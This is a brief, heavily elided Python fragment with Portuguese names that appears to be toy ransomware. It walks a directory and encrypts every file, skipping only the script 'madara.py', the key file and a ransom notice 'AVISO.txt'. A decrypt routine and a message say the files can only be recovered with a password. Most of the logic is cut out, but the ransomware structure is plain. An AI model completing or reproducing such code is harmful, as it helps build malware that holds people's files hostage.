...
def criptografar_arquivos():
    ...
    for root, dirs, files in os.walk(caminho):
        for file in files:
            if file in ["madara.py", "chave.key", "AVISO.txt"]:
                continue
...
def descriptografar_arquivos():
    ...
    print(Fore.GREEN + "✅ Todos os arquivos foram descriptografados com sucesso! ✅")

def main():
    aviso_path = os.path.join(caminho, "AVISO.txt")
    if not os.path.exists(aviso_path):
        ...
        print(Fore.CYAN + "⚠️ Para descriptografar os arquivos, você precisa da senha!")
